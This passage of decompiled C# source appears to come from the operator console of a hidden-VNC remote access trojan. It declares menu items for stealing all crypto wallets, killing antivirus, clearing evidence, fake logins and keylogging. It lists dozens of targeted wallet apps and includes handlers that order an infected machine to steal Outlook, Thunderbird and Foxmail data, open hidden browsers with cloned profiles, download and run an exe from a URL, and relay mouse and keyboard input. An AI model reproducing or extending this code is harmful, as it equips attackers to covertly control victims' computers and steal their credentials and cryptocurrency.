        private ToolStripMenuItem dingTalkToolStripMenuItem;

        // Token: 0x04000587 RID: 1415
        private ToolStripMenuItem downloadLogsViaSocketToolStripMenuItem;

        // Token: 0x04000588 RID: 1416
        private ToolStripMenuItem clearEvidenceToolStripMenuItem;

        // Token: 0x04000589 RID: 1417
        private StudioButton studioButton11;

        // Token: 0x0400058A RID: 1418
        private ToolStripMenuItem powershellToolStripMenuItem;

        // Token: 0x0400058B RID: 1419
        private ToolStripMenuItem cMDToolStripMenuItem;

        // Token: 0x0400058C RID: 1420
        private ToolStripMenuItem explorerToolStripMenuItem;

        // Token: 0x0400058D RID: 1421
        private ToolStripMenuItem copyToolStripMenuItem;

        // Token: 0x0400058E RID: 1422
        private ToolStripMenuItem pasteToolStripMenuItem;

        // Token: 0x0400058F RID: 1423
        private ToolTip toolTip1;

        // Token: 0x04000590 RID: 1424
        public StatusStrip statusStrip1;

        // Token: 0x04000591 RID: 1425
        private ToolStripStatusLabel toolStripStatusLabel3;

        // Token: 0x04000592 RID: 1426
        public ToolStripStatusLabel PingStatusLabel;

        // Token: 0x04000593 RID: 1427
        private Timer timer4;

        // Token: 0x04000594 RID: 1428
        private ToolStripMenuItem fakeLoginToolStripMenuItem;

        // Token: 0x04000595 RID: 1429
        private ToolStripMenuItem killAllAntivusesToolStripMenuItem;

        // Token: 0x04000596 RID: 1430
        private StudioButton btnKeyl;

        // Token: 0x04000597 RID: 1431
        private ContextMenuStrip contextMenuStrip7;

        // Token: 0x04000598 RID: 1432
        private ToolStripMenuItem startToolStripMenuItem;

        // Token: 0x04000599 RID: 1433
        private Timer timer5;

        // Token: 0x0400059A RID: 1434
        private ToolStripMenuItem stopToolStripMenuItem;

        // Token: 0x0400059B RID: 1435
        internal RichTextBox txtClip;

        // Token: 0x0400059C RID: 1436
        internal RichTextBox txtKeyl;

        // Token: 0x0400059D RID: 1437
        private Button studioButton12;

        // Token: 0x0400059E RID: 1438
        private Label label2;

        // Token: 0x0400059F RID: 1439
        private JCS.ToggleSwitch chkKeylog;

        // Token: 0x040005A0 RID: 1440
        private Button btnClip;

        // Token: 0x040005A1 RID: 1441
        private Label label4;

        // Token: 0x040005A2 RID: 1442
        private JCS.ToggleSwitch chkClip;

        // Token: 0x040005A3 RID: 1443
        private Label label9;

        // Token: 0x040005A4 RID: 1444
        private Label label8;

        // Token: 0x040005A5 RID: 1445
        private Label label7;

        // Token: 0x040005A6 RID: 1446
        private Label label6;

        // Token: 0x040005A7 RID: 1447
        private Label label5;

        // Token: 0x040005A8 RID: 1448
        private AmbianceTabControl ambianceTabControl1;

        // Token: 0x040005A9 RID: 1449
        private TabPage tabPage1;

        // Token: 0x040005AA RID: 1450
        private Label label29;

        // Token: 0x040005AB RID: 1451
        private Label label32;

        // Token: 0x040005AC RID: 1452
        private Label label33;

        // Token: 0x040005AD RID: 1453
        private Label label34;

        // Token: 0x040005AE RID: 1454
        private Label label23;

        // Token: 0x040005AF RID: 1455
        private Label label24;

        // Token: 0x040005B0 RID: 1456
        private Label label26;

        // Token: 0x040005B1 RID: 1457
        private Label label27;

        // Token: 0x040005B2 RID: 1458
        private Label label28;

        // Token: 0x040005B3 RID: 1459
        private Label label22;

        // Token: 0x040005B4 RID: 1460
        private Label label19;

        // Token: 0x040005B5 RID: 1461
        private Label label20;

        // Token: 0x040005B6 RID: 1462
        private Label label21;

        // Token: 0x040005B7 RID: 1463
        private Label label16;

        // Token: 0x040005B8 RID: 1464
        private Label label17;

        // Token: 0x040005B9 RID: 1465
        private Label label13;

        // Token: 0x040005BA RID: 1466
        private Label label14;

        // Token: 0x040005BB RID: 1467
        private Label label15;

        // Token: 0x040005BC RID: 1468
        private Label label10;

        // Token: 0x040005BD RID: 1469
        private Label label11;

        // Token: 0x040005BE RID: 1470
        private Label label12;

        // Token: 0x040005BF RID: 1471
        private TabPage tabPage3;

        // Token: 0x040005C0 RID: 1472
        private TabPage tabPage4;

        // Token: 0x040005C1 RID: 1473
        private Panel panel1;

        // Token: 0x040005C2 RID: 1474
        private Label label18;

        // Token: 0x040005C3 RID: 1475
        private JCS.ToggleSwitch chkInfo;

        // Token: 0x040005C4 RID: 1476
        private Button btnInfo;

        // Token: 0x040005C5 RID: 1477
        private Label label30;

        // Token: 0x040005C6 RID: 1478
        private Timer timer6;

        // Token: 0x040005C7 RID: 1479
        private Timer timer7;

        // Token: 0x040005C8 RID: 1480
        internal Label txtScreen;

        // Token: 0x040005C9 RID: 1481
        internal Label txtFPS;

        // Token: 0x040005CA RID: 1482
        private Timer timer8;

        // Token: 0x040005CB RID: 1483
        private Timer timer9;

        // Token: 0x040005CC RID: 1484
        private TabPage tabPage5;

        // Token: 0x040005CD RID: 1485
        private GMapControl map;

        // Token: 0x040005CE RID: 1486
        private Label label31;

        // Token: 0x040005CF RID: 1487
        private Label label25;

        // Token: 0x040005D0 RID: 1488
        internal TextBox txtlongitude;

        // Token: 0x040005D1 RID: 1489
        internal TextBox txtlatitude;

        // Token: 0x040005D2 RID: 1490
        private Label label37;

        // Token: 0x040005D3 RID: 1491
        private Label label36;

        // Token: 0x040005D4 RID: 1492
        private Label label35;

        // Token: 0x040005D5 RID: 1493
        private RJCircularPictureBox rjCircularPictureBox1;

        // Token: 0x040005D6 RID: 1494
        private RJCircularPictureBox rjCircularPictureBox31;

        // Token: 0x040005D7 RID: 1495
        private RJCircularPictureBox rjCircularPictureBox30;

        // Token: 0x040005D8 RID: 1496
        private RJCircularPictureBox rjCircularPictureBox29;

        // Token: 0x040005D9 RID: 1497
        private RJCircularPictureBox rjCircularPictureBox28;

        // Token: 0x040005DA RID: 1498
        private RJCircularPictureBox rjCircularPictureBox27;

        // Token: 0x040005DB RID: 1499
        private RJCircularPictureBox rjCircularPictureBox26;

        // Token: 0x040005DC RID: 1500
        private RJCircularPictureBox rjCircularPictureBox25;

        // Token: 0x040005DD RID: 1501
        private RJCircularPictureBox rjCircularPictureBox24;

        // Token: 0x040005DE RID: 1502
        private RJCircularPictureBox rjCircularPictureBox23;

        // Token: 0x040005DF RID: 1503
        private RJCircularPictureBox rjCircularPictureBox22;

        // Token: 0x040005E0 RID: 1504
        private RJCircularPictureBox rjCircularPictureBox21;

        // Token: 0x040005E1 RID: 1505
        private RJCircularPictureBox rjCircularPictureBox20;

        // Token: 0x040005E2 RID: 1506
        private RJCircularPictureBox rjCircularPictureBox19;

        // Token: 0x040005E3 RID: 1507
        private RJCircularPictureBox rjCircularPictureBox18;

        // Token: 0x040005E4 RID: 1508
        private RJCircularPictureBox rjCircularPictureBox17;

        // Token: 0x040005E5 RID: 1509
        private RJCircularPictureBox rjCircularPictureBox16;

        // Token: 0x040005E6 RID: 1510
        private RJCircularPictureBox rjCircularPictureBox15;

        // Token: 0x040005E7 RID: 1511
        private RJCircularPictureBox rjCircularPictureBox14;

        // Token: 0x040005E8 RID: 1512
        private RJCircularPictureBox rjCircularPictureBox13;

        // Token: 0x040005E9 RID: 1513
        private RJCircularPictureBox rjCircularPictureBox12;

        // Token: 0x040005EA RID: 1514
        private RJCircularPictureBox rjCircularPictureBox9;

        // Token: 0x040005EB RID: 1515
        private RJCircularPictureBox rjCircularPictureBox10;

        // Token: 0x040005EC RID: 1516
        private RJCircularPictureBox rjCircularPictureBox11;

        // Token: 0x040005ED RID: 1517
        private RJCircularPictureBox rjCircularPictureBox6;

        // Token: 0x040005EE RID: 1518
        private RJCircularPictureBox rjCircularPictureBox7;

        // Token: 0x040005EF RID: 1519
        private RJCircularPictureBox rjCircularPictureBox5;

        // Token: 0x040005F0 RID: 1520
        private RJCircularPictureBox rjCircularPictureBox4;

        // Token: 0x040005F1 RID: 1521
        private RJCircularPictureBox rjCircularPictureBox3;

        // Token: 0x040005F2 RID: 1522
        private RJCircularPictureBox rjCircularPictureBox2;

        // Token: 0x040005F3 RID: 1523
        internal Label txtBitapp;

        // Token: 0x040005F4 RID: 1524
        internal Label txtCoin98;

        // Token: 0x040005F5 RID: 1525
        internal Label txtEqual;

        // Token: 0x040005F6 RID: 1526
        internal Label txtMetamask;

        // Token: 0x040005F7 RID: 1527
        internal Label txtJaxx;

        // Token: 0x040005F8 RID: 1528
        internal Label txtKeplr;

        // Token: 0x040005F9 RID: 1529
        internal Label txtCrocobit;

        // Token: 0x040005FA RID: 1530
        internal Label txtOxygen;

        // Token: 0x040005FB RID: 1531
        internal Label txtGuarda;

        // Token: 0x040005FC RID: 1532
        internal Label txtBytecoin;

        // Token: 0x040005FD RID: 1533
        internal Label txtMobox;

        // Token: 0x040005FE RID: 1534
        internal Label txtGuild;

        // Token: 0x040005FF RID: 1535
        internal Label txtIconex;

        // Token: 0x04000600 RID: 1536
        internal Label txtTon;

        // Token: 0x04000601 RID: 1537
        internal Label txtCoinomi;

        // Token: 0x04000602 RID: 1538
        internal Label txtSollet;

        // Token: 0x04000603 RID: 1539
        internal Label txtSlope;

        // Token: 0x04000604 RID: 1540
        internal Label txtStarcoin;

        // Token: 0x04000605 RID: 1541
        internal Label txtPhantom;

        // Token: 0x04000606 RID: 1542
        internal Label txtArmory;

        // Token: 0x04000607 RID: 1543
        internal Label txtFinnie;

        // Token: 0x04000608 RID: 1544
        internal Label txtBinance;

        // Token: 0x04000609 RID: 1545
        internal Label txtXinPay;

        // Token: 0x0400060A RID: 1546
        internal Label txtMath;

        // Token: 0x0400060B RID: 1547
        internal Label txtExodus;

        // Token: 0x0400060C RID: 1548
        internal Label txtLiquality;

        // Token: 0x0400060D RID: 1549
        internal Label txtTron;

        // Token: 0x0400060E RID: 1550
        internal Label txtSwash;

        // Token: 0x0400060F RID: 1551
        internal Label txtNifty;

        // Token: 0x04000610 RID: 1552
        internal Label txtzcash;

        // Token: 0x04000611 RID: 1553
        internal TabPage tabPage2;

        // Token: 0x04000612 RID: 1554
        private ContextMenuStrip FileManagerContextMenuStrip;

        // Token: 0x04000613 RID: 1555
        private ToolStripMenuItem networkingToolStripMenuItem;

        // Token: 0x04000614 RID: 1556
        private ToolStripMenuItem downloadFIleToolStripMenuItem;

        // Token: 0x04000615 RID: 1557
        private ToolStripMenuItem uploadFileToolStripMenuItem;

        // Token: 0x04000616 RID: 1558
        private ToolStripSeparator toolStripSeparator3;

        // Token: 0x04000617 RID: 1559
        private ToolStripMenuItem executeFileToolStripMenuItem;

        // Token: 0x04000618 RID: 1560
        private ToolStripMenuItem createDirectoryToolStripMenuItem;

        // Token: 0x04000619 RID: 1561
        private ToolStripMenuItem refreshDirectoryToolStripMenuItem;

        // Token: 0x0400061A RID: 1562
        private ToolStripSeparator toolStripSeparator4;

        // Token: 0x0400061B RID: 1563
        private ToolStripMenuItem deleteFolderFileToolStripMenuItem;

        // Token: 0x0400061C RID: 1564
        private ToolStripMenuItem cryptographyToolStripMenuItem;

        // Token: 0x0400061D RID: 1565
        private ToolStripMenuItem encryptFileToolStripMenuItem;

        // Token: 0x0400061E RID: 1566
        private ToolStripMenuItem decryptFileToolStripMenuItem;

        // Token: 0x0400061F RID: 1567
        private ToolStripMenuItem blockFileToolStripMenuItem;

        // Token: 0x04000620 RID: 1568
        private ToolStripSeparator toolStripSeparator5;

        // Token: 0x04000621 RID: 1569
        private ToolStripMenuItem searchDirectoryToolStripMenuItem;

        // Token: 0x04000622 RID: 1570
        private ToolStripMenuItem searchForFileToolStripMenuItem;

        // Token: 0x04000623 RID: 1571
        private ImageList FileManagerImageList;

        // Token: 0x04000624 RID: 1572
        private Button studioButton13;

        // Token: 0x04000625 RID: 1573
        private Timer timer10;

        // Token: 0x04000626 RID: 1574
        private Timer timer11;

        // Token: 0x04000627 RID: 1575
        private ToolStripMenuItem stealAllWalletsToolStripMenuItem;

        // Token: 0x0600075E RID: 1886 RVA: 0x0000A394 File Offset: 0x00008594
        private void thunderbirdToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("557*", tcpClient_0);
		}

		// Token: 0x0600075F RID: 1887 RVA: 0x0000A3A7 File Offset: 0x000085A7
		private void outlookToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("555*", tcpClient_0);
		}

		// Token: 0x06000760 RID: 1888 RVA: 0x0000A3BA File Offset: 0x000085BA
		private void foxMailToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SendTCP("556*", tcpClient_0);
		}

		// Token: 0x06000761 RID: 1889 RVA: 0x0000A3CD File Offset: 0x000085CD
		public void hURL(string url)
		{
			SendTCP("8585* " + url, (TcpClient)Tag);
		}

		// Token: 0x06000762 RID: 1890 RVA: 0x0000A3EB File Offset: 0x000085EB
		public void UpdateClient(string url)
		{
			SendTCP("8589* " + url, (TcpClient)Tag);
		}

		// Token: 0x06000763 RID: 1891 RVA: 0x0000A409 File Offset: 0x00008609
		public void ResetScale()
		{
			SendTCP("8587*", (TcpClient)Tag);
		}

		// Token: 0x170001D7 RID: 471
		// (get) Token: 0x06000764 RID: 1892 RVA: 0x000481B0 File Offset: 0x000463B0
		// (set) Token: 0x06000765 RID: 1893 RVA: 0x0000A421 File Offset: 0x00008621
		public PictureBox VNCBoxe
		{
			get
			{
				return VNCBox;
			}
			set
			{
				VNCBox = value;
			}
		}

		// Token: 0x170001D8 RID: 472
		// (get) Token: 0x06000766 RID: 1894 RVA: 0x000481C8 File Offset: 0x000463C8
		// (set) Token: 0x06000767 RID: 1895 RVA: 0x0000A42A File Offset: 0x0000862A
		public ToolStripStatusLabel toolStripStatusLabel2_
		{
			get
			{
				return toolStripStatusLabel2;
			}
			set
			{
				toolStripStatusLabel2 = value;
			}
		}

		// Token: 0x06000768 RID: 1896 RVA: 0x0000A433 File Offset: 0x00008633
		private void VNCBox_MouseEnter(object sender, EventArgs e)
		{
			Focus();
		}

		// Token: 0x06000769 RID: 1897 RVA: 0x0000A43C File Offset: 0x0000863C
		private void VNCBox_MouseLeave(object sender, EventArgs e)
		{
			FindForm().ActiveControl = null;
		}

		// Token: 0x0600076A RID: 1898 RVA: 0x0000A44A File Offset: 0x0000864A
		private void VNCBox_KeyPress(object sender, KeyPressEventArgs e)
		{
			SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
		}

		// Token: 0x0600076B RID: 1899 RVA: 0x000481E0 File Offset: 0x000463E0
		private void VNCForm_Load(object sender, EventArgs e)
		{
			contextMenuStrip1.Renderer = new BlueRenderer();
			contextMenuStrip2.Renderer = new BlueRenderer();
			contextMenuStrip3.Renderer = new BlueRenderer();
			contextMenuStrip4.Renderer = new BlueRenderer();
			contextMenuStrip5.Renderer = new BlueRenderer();
			contextMenuStrip6.Renderer = new BlueRenderer();
			if (FrmTransfer0.IsDisposed)
			{
				FrmTransfer0 = new MoveBytes();
			}
			FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
			tcpClient_0 = (TcpClient)Tag;
			VNCBox.Tag = new Size(1028, 1028);
			new ThreadStart(delegate
			{
				SendTCP("0*", tcpClient_0);
				SendTCP("18*" + "100", tcpClient_0);
				SendTCP("19*" + Conversions.ToString(ResizeScroll.Value / 100.0), tcpClient_0);
				SendTCP("2068*" + Conversions.ToString(false), (TcpClient)Tag);
				SendTCP("2075*" + Conversions.ToString(false), (TcpClient)Tag);
				SendTCP("2076*" + Conversions.ToString(false), (TcpClient)Tag);
			}).Invoke();
			timer3.Interval = 10000;
			timer3.Tick += timer3_Tick;
			timer3.Start();
			timer4.Interval = 10000;
			timer4.Tick += timer4_Tick;
			timer4.Start();
			timer5.Interval = 10000;
			timer5.Tick += timer5_Tick;
			timer5.Start();
			timer6.Interval = 10000;
			timer6.Tick += timer6_Tick;
			timer6.Start();
			timer7.Interval = 10000;
			timer7.Tick += timer7_Tick;
			timer7.Start();
			timer11.Interval = 10000;
			timer11.Tick += timer11_Tick;
			timer11.Start();
		}

		// Token: 0x0600076C RID: 1900 RVA: 0x000483F0 File Offset: 0x000465F0
		public static Image ImageFromBase64String(string base64)
		{
			MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(base64));
			Image image = Image.FromStream(memoryStream);
			memoryStream.Close();
			return image;
		}

		// Token: 0x0600076D RID: 1901 RVA: 0x0004841C File Offset: 0x0004661C
		private void setRdesktopImg(string imgBytes)
		{
			try
			{
				FormCollection openForms = Application.OpenForms;
				string text = "VNCForm:";
				TcpClient tcpClient = tcpClient_0;
				hVNC hVNC = openForms[text + ((tcpClient != null) ? tcpClient.ToString() : null)] as hVNC;
				((PictureBox)hVNC.Controls["pictureBox2"]).Image = ImageFromBase64String(imgBytes);
			}
			catch
			{
			}
		}

		// Token: 0x0600076E RID: 1902 RVA: 0x0004848C File Offset: 0x0004668C
		public void Check()
		{
			try
			{
				if (FrmTransfer0.FileTransferLabele.Text == null)
				{
					toolStripStatusLabel3.Text = "Status";
				}
				else
				{
					toolStripStatusLabel3.Text = FrmTransfer0.FileTransferLabele.Text;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600076F RID: 1903 RVA: 0x0000A46D File Offset: 0x0000866D
		private void timer1_Tick(object sender, EventArgs e)
		{
			checked
			{
				int_0 += 100;
				if (int_0 >= SystemInformation.DoubleClickTime)
				{
					bool_1 = true;
					bool_2 = false;
					int_0 = 0;
				}
			}
		}

		// Token: 0x06000770 RID: 1904 RVA: 0x0000A4A5 File Offset: 0x000086A5
		private void ShowStart_Click(object sender, EventArgs e)
		{
			SendTCP("13*", tcpClient_0);
		}

		// Token: 0x06000771 RID: 1905 RVA: 0x000484F4 File Offset: 0x000466F4
		private void VNCBox_MouseDown(object sender, MouseEventArgs e)
		{
			if (bool_1)
			{
				bool_1 = false;
				timer1.Start();
			}
			else if (int_0 < SystemInformation.DoubleClickTime)
			{
				bool_2 = true;
			}
			Point location = e.Location;
			object tag = VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = VNCBox.Width / (double)size.Width;
			double num2 = VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling(location.X / num);
			double num4 = Math.Ceiling(location.Y / num2);
			if (bool_2)
			{
				if (e.Button == MouseButtons.Left)
				{
					SendTCP("6*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
				}
			}
			else if (e.Button == MouseButtons.Left)
			{
				SendTCP("2*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
			else if (e.Button == MouseButtons.Right)
			{
				SendTCP("3*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
		}

		// Token: 0x06000772 RID: 1906 RVA: 0x00048664 File Offset: 0x00046864
		private void VNCBox_MouseUp(object sender, MouseEventArgs e)
		{
			Point location = e.Location;
			object tag = VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = VNCBox.Width / (double)size.Width;
			double num2 = VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling(location.X / num);
			double num4 = Math.Ceiling(location.Y / num2);
			if (e.Button == MouseButtons.Left)
			{
				SendTCP("4*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
			else if (e.Button == MouseButtons.Right)
			{
				SendTCP("5*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
			}
		}

		// Token: 0x06000773 RID: 1907 RVA: 0x00048760 File Offset: 0x00046960
		private void VNCBox_MouseMove(object sender, MouseEventArgs e)
		{
			Point location = e.Location;
			object tag = VNCBox.Tag;
			Size size = ((tag != null) ? ((Size)tag) : default(Size));
			double num = VNCBox.Width / (double)size.Width;
			double num2 = VNCBox.Height / (double)size.Height;
			double num3 = Math.Ceiling(location.X / num);
			double num4 = Math.Ceiling(location.Y / num2);
			SendTCP("8*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
		}

		// Token: 0x06000774 RID: 1908 RVA: 0x00048810 File Offset: 0x00046A10
		private void IntervalScroll_Scroll(object sender, EventArgs e)
		{
			IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(IntervalScroll.Value);
			SendTCP("17*" + Conversions.ToString(IntervalScroll.Value), tcpClient_0);
		}

		// Token: 0x06000775 RID: 1909 RVA: 0x00048868 File Offset: 0x00046A68
		private void QualityScroll_Scroll(object sender, EventArgs e)
		{
			QualityLabel.Text = "Quality : " + Conversions.ToString(QualityScroll.Value) + "%";
			SendTCP("18*" + Conversions.ToString(QualityScroll.Value), tcpClient_0);
		}

		// Token: 0x06000776 RID: 1910 RVA: 0x000488C8 File Offset: 0x00046AC8
		private void ResizeScroll_Scroll(object sender, EventArgs e)
		{
			ResizeLabel.Text = "Resize : " + Conversions.ToString(ResizeScroll.Value) + "%";
			SendTCP("19*" + Conversions.ToString(ResizeScroll.Value / 100.0), tcpClient_0);
		}

		// Token: 0x06000777 RID: 1911 RVA: 0x0000A4B8 File Offset: 0x000086B8
		private void RestoreMaxBtn_Click(object sender, EventArgs e)
		{
			SendTCP("15*", tcpClient_0);
		}

		// Token: 0x06000778 RID: 1912 RVA: 0x0000A4CB File Offset: 0x000086CB
		private void MinBtn_Click(object sender, EventArgs e)
		{
			SendTCP("14*", tcpClient_0);
		}

		// Token: 0x06000779 RID: 1913 RVA: 0x0000A4DE File Offset: 0x000086DE
		private void CloseBtn_Click(object sender, EventArgs e)
		{
			SendTCP("16*", tcpClient_0);
		}

		// Token: 0x0600077A RID: 1914 RVA: 0x00030258 File Offset: 0x0002E458
		private void SendTCP(object object_0, TcpClient tcpClient_1)
		{
			checked
			{
				try
				{
					lock (tcpClient_1)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						object objectValue = RuntimeHelpers.GetObjectValue(object_0);
						MemoryStream memoryStream = new MemoryStream();
						binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
						ulong num = (ulong)memoryStream.Position;
						tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
						byte[] buffer = memoryStream.GetBuffer();
						tcpClient_1.GetStream().Write(buffer, 0, (int)num);
						memoryStream.Close();
						memoryStream.Dispose();
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x0600077B RID: 1915 RVA: 0x0000A44A File Offset: 0x0000864A
		private void VNCForm_KeyPress(object sender, KeyPressEventArgs e)
		{
			SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
		}

		// Token: 0x0600077C RID: 1916 RVA: 0x0000A4F1 File Offset: 0x000086F1
		private void VNCForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			VNCBox.Image = null;
			GC.Collect();
			Hide();
			e.Cancel = true;
		}

		// Token: 0x0600077D RID: 1917 RVA: 0x0000A511 File Offset: 0x00008711
		private void VNCForm_Click(object sender, EventArgs e)
		{
			method_18(null);
		}

		// Token: 0x0600077E RID: 1918 RVA: 0x0000A51A File Offset: 0x0000871A
		internal void method_18(object object_0)
		{
			method_0((Control)object_0);
		}

		// Token: 0x0600077F RID: 1919 RVA: 0x0000A528 File Offset: 0x00008728
		private void timer2_Tick(object sender, EventArgs e)
		{
			Check();
		}

		// Token: 0x06000780 RID: 1920 RVA: 0x0000A433 File Offset: 0x00008633
		private void VNCBox_MouseEnter_1(object sender, EventArgs e)
		{
			Focus();
		}

		// Token: 0x06000781 RID: 1921 RVA: 0x0000A433 File Offset: 0x00008633
		private void VNCBox_MouseHover(object sender, EventArgs e)
		{
			Focus();
		}

		// Token: 0x06000782 RID: 1922 RVA: 0x00048930 File Offset: 0x00046B30
		private void btnChrome_Click(object sender, EventArgs e)
		{
			if (!btnChrome.Text.Contains("Started"))
			{
				if (chkClone.Checked)
				{
					if (FrmTransfer0.IsDisposed)
					{
						FrmTransfer0 = new MoveBytes();
					}
					FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
					FrmTransfer0.Hide();
					SendTCP("11*" + Conversions.ToString(true), (TcpClient)Tag);
					btnChrome.Text = "Chrome Started";
				}
				else
				{
					SendTCP("11*" + Conversions.ToString(false), (TcpClient)Tag);
					btnChrome.Text = "Chrome Started";
				}
			}
			else
			{
				SendTCP("2005*" + Conversions.ToString(false), (TcpClient)Tag);
				btnChrome.Text = "Chrome Stopped";
			}
		}

		// Token: 0x06000783 RID: 1923 RVA: 0x00048A38 File Offset: 0x00046C38
		private void btnEdge_Click(object sender, EventArgs e)
		{
			if (!btnEdge.Text.Contains("Started"))
			{
				if (chkClone.Checked)
				{
					if (FrmTransfer0.IsDisposed)
					{
						FrmTransfer0 = new MoveBytes();
					}
					FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
					FrmTransfer0.Hide();
					SendTCP("30*" + Conversions.ToString(true), (TcpClient)Tag);
					btnEdge.Text = "Edge Started";
				}
				else
				{
					SendTCP("30*" + Conversions.ToString(false), (TcpClient)Tag);
					btnEdge.Text = "Edge Started";
				}
			}
			else
			{
				SendTCP("2002*" + Conversions.ToString(false), (TcpClient)Tag);
				btnEdge.Text = "Edge Stopped";
			}
		}

		// Token: 0x06000784 RID: 1924 RVA: 0x00048B40 File Offset: 0x00046D40
		private void btnFirefox_Click(object sender, EventArgs e)
		{
			if (!btnFirefox.Text.Contains("Started"))
			{
				if (chkClone.Checked)
				{
					if (FrmTransfer0.IsDisposed)
					{
						FrmTransfer0 = new MoveBytes();
					}
					FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
					FrmTransfer0.Hide();
					SendTCP("12*" + Conversions.ToString(true), (TcpClient)Tag);
					btnFirefox.Text = "Firefox Started";
				}
				else
				{
					SendTCP("12*" + Conversions.ToString(false), (TcpClient)Tag);
					btnFirefox.Text = "Firefox Started";
				}
			}
			else
			{
				SendTCP("2001*" + Conversions.ToString(false), (TcpClient)Tag);
				btnFirefox.Text = "Firefox Stopped";
			}
		}

		// Token: 0x06000785 RID: 1925 RVA: 0x00048C48 File Offset: 0x00046E48
		private void btnOpera_Click(object sender, EventArgs e)
		{
			if (!btnEpic.Text.Contains("Started"))
			{
				if (chkClone.Checked)
				{
					if (FrmTransfer0.IsDisposed)
					{
						FrmTransfer0 = new MoveBytes();
					}
					FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
					FrmTransfer0.Hide();
					SendTCP("12*" + Conversions.ToString(true), (TcpClient)Tag);
					btnEpic.Text = "Epic Started";
				}
				else
				{
					SendTCP("12*" + Conversions.ToString(false), (TcpClient)Tag);
					btnEpic.Text = "Epic Started";
				}
			}
			else
			{
				SendTCP("2003*" + Conversions.ToString(false), (TcpClient)Tag);
				btnEpic.Text = "Epic Stopped";
			}
		}

		// Token: 0x06000786 RID: 1926 RVA: 0x00048D50 File Offset: 0x00046F50
		private void btnBrave_Click(object sender, EventArgs e)
		{
			if (!btnBrave.Text.Contains("Started"))
			{
				if (chkClone.Checked)
				{
					if (FrmTransfer0.IsDisposed)
					{
						FrmTransfer0 = new MoveBytes();
					}
					FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
					FrmTransfer0.Hide();
					SendTCP("32*" + Conversions.ToString(true), (TcpClient)Tag);
					btnBrave.Text = "Started";
				}
				else
				{
					SendTCP("32*" + Conversions.ToString(false), (TcpClient)Tag);
					btnBrave.Text = "Brave Started";
				}
			}
			else
			{
				SendTCP("2005*" + Conversions.ToString(false), (TcpClient)Tag);
				btnBrave.Text = "Brave Stopped";
			}
		}

		// Token: 0x06000787 RID: 1927 RVA: 0x0000A530 File Offset: 0x00008730
		private void btnPowershell_Click(object sender, EventArgs e)
		{
			SendTCP("4876*", tcpClient_0);
		}

		// Token: 0x06000788 RID: 1928 RVA: 0x0000A543 File Offset: 0x00008743
		private void btnCMD_Click(object sender, EventArgs e)
		{
			SendTCP("4875*", tcpClient_0);
		}

		// Token: 0x06000789 RID: 1929 RVA: 0x0000A556 File Offset: 0x00008756
		private void btnEx_Click(object sender, EventArgs e)
		{
			SendTCP("21*", tcpClient_0);
		}

		// Token: 0x0600078A RID: 1930 RVA: 0x00048E58 File Offset: 0x00047058
		private void btnCopy_Click(object sender, EventArgs e)
		{
			try
			{
				SendTCP("10*" + Clipboard.GetText(), tcpClient_0);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600078B RID: 1931 RVA: 0x0000A569 File Offset: 0x00008769
		private void btnPaste_Click(object sender, EventArgs e)
		{
			SendTCP("9*", tcpClient_0);
		}

		// Token: 0x0600078C RID: 1932 RVA: 0x00048EA4 File Offset: 0x000470A4
		private void studioButton1_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url");
			if (!string.IsNullOrEmpty(text) && !string.IsNullOrEmpty(text))
			{
				SendTCP("56*" + text, (TcpClient)Tag);
			}
		}

		// Token: 0x0600078D RID: 1933 RVA: 0x00048EF4 File Offset: 0x000470F4
		private void btnVivaldi_Click(object sender, EventArgs e)
		{
			if (!btnVivaldi.Text.Contains("Started"))
			{
				if (chkClone.Checked)
				{
					if (FrmTransfer0.IsDisposed)
					{
						FrmTransfer0 = new MoveBytes();
					}
					FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
					FrmTransfer0.Hide();
					SendTCP("1004*" + Conversions.ToString(true), (TcpClient)Tag);
					btnVivaldi.Text = "Vivaldi Started";
				}
				else
				{
					SendTCP("1004*" + Conversions.ToString(false), (TcpClient)Tag);
					btnVivaldi.Text = "Vivaldi Started";
				}
			}
			else
			{
				SendTCP("2004*" + Conversions.ToString(false), (TcpClient)Tag);
				btnVivaldi.Text = "Vivaldi Stopped";
			}
		}

		// Token: 0x0600078E RID: 1934 RVA: 0x00048FFC File Offset: 0x000471FC
		private void btnSputnik_Click(object sender, EventArgs e)
		{
